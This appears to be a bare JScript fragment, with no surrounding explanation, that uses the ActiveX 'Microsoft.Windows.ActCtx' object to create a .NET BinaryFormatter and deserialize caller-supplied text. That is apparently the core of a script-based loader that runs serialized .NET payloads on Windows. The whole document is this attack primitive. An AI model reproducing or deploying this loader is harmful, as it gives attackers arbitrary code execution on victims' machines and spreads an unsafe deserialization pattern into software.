function good(text){	
var actObj = new ActiveXObject("Microsoft.Windows.ActCtx");
var fmt_1 = actObj.CreateObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
fmt_1.Deserialize_2(text);
}
